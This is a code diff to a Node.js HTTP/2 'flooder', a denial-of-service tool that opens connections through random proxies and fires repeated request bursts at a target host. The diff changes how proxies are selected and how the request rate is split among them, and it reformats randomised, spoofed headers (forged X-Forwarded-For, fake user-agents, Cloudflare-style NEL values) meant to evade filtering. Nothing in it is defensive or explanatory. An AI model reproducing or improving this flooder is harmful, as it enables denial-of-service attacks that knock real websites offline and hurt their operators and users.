@@ -341,18 +341,10 @@ return result;
 const randstrsValue = randstrs(10);
 
 function runFlooder() {
-    const proxyCount = Math.min(proxies.length, 5); // Use up to 5 proxies concurrently
-    const selectedProxies = [];
-    
-    // Select random unique proxies
-    while (selectedProxies.length < proxyCount) {
-        const proxy = randomElement(proxies);
-        if (!selectedProxies.includes(proxy)) {
-            selectedProxies.push(proxy);
-        }
-    }
+    const proxyCount = Math.floor(args.Rate / 10) || 1; // Use 1 proxy per 10 requests, minimum 1
 
-    selectedProxies.forEach(proxyAddr => {
+    for (let p = 0; p < proxyCount; p++) {
+        const proxyAddr = randomElement(proxies); // Randomly pick a proxy without storing
         const parsedProxy = proxyAddr.split(":");
         const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";
         const nm = [
@@ -462,7 +454,7 @@ function runFlooder() {
         var nm5 = winch[Math.floor(Math.random() * winch.length)];
         var nm6 = nmx1[Math.floor(Math.random() * nmx1.length)];
         var kha = rd[Math.floor(Math.random() * rd.length)];
-        
+
         encoding_header = [
             'gzip, deflate, br',
             'compress, gzip',
@@ -504,25 +496,25 @@ function runFlooder() {
             'NEl': JSON.stringify({
                 "report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
                 "max-age": Math.random() < 0.5 ? 604800 : 2561000,
-                "include_subdomains": Math.random() < 0.5 ? true : false
+                "include_subdomains": Math.random() < 0.5
             })
         };
 
         const rateHeaders = [
-            {"accept": accept_header[Math.floor(Math.random() * accept_header.length)]},
-            {"Access-Control-Request-Method": "GET"},
-            {"accept-language": language_header[Math.floor(Math.random() * language_header.length)]},
-            {"origin": "https://" + parsedTarget.host},
-            {"source-ip": randstr(5)},
-            {"data-return": "false"},
-            {"X-Forwarded-For": parsedProxy[0]},
-            {"NEL": val},
-            {"dnt": "1"},
-            {"A-IM": "Feed"},
-            {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
-            {'Delta-Base': '12340001'},
-            {"te": "trailers"},
-            {"accept-language": language_header[Math.floor(Math.random() * language_header.length)]},
+            { "accept": accept_header[Math.floor(Math.random() * accept_header.length)] },
+            { "Access-Control-Request-Method": "GET" },
+            { "accept-language": language_header[Math.floor(Math.random() * language_header.length)] },
+            { "origin": "https://" + parsedTarget.host },
+            { "source-ip": randstr(5) },
+            { "data-return": "false" },
+            { "X-Forwarded-For": parsedProxy[0] },
+            { "NEL": val },
+            { "dnt": "1" },
+            { "A-IM": "Feed" },
+            { 'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none' },
+            { 'Delta-Base': '12340001' },
+            { "te": "trailers" },
+            { "accept-language": language_header[Math.floor(Math.random() * language_header.length)] },
         ];
 
         let headers = {
@@ -537,7 +529,7 @@ function runFlooder() {
             "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
             "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
             "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
-            "user-agent": "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha + " " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4,
+            "user-agent": "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha + " " + nm4 + ") /Gecko/20100101 Edg/91.0.864.104 " + nm4,
         };
 
         const proxyOptions = {
@@ -598,7 +590,7 @@ function runFlooder() {
 
             client.on("connect", () => {
                 const IntervalAttack = setInterval(() => {
-                    for (let i = 0; i < args.Rate / proxyCount; i++) { // Distribute requests across proxies
+                    for (let i = 0; i < Math.ceil(args.Rate / proxyCount); i++) { // Distribute requests
                         const dynHeaders = {
                             ...headers,
                             ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
@@ -611,10 +603,11 @@ function runFlooder() {
                             exclusive: true,
                             weight: 220,
                         })
-                        .on('response', response => {
-                            request.close();
-                            request.destroy();
-                        });
+                            .on('response', response => {
+                                request.close();
+                                request.destroy();
+                                return;
+                            });
                         request.end();
                     }
                 }, 300);
@@ -624,19 +617,22 @@ function runFlooder() {
                 client.destroy();
                 tlsConn.destroy();
                 connection.destroy();
+                return;
             });
 
             client.on("timeout", () => {
                 client.destroy();
                 connection.destroy();
+                return;
             });
 
             client.on("error", error => {
                 client.destroy();
                 connection.destroy();
+                return;
             });
         });
-    });
+    }
 }
 
 const StopScript = () => process.exit(1);
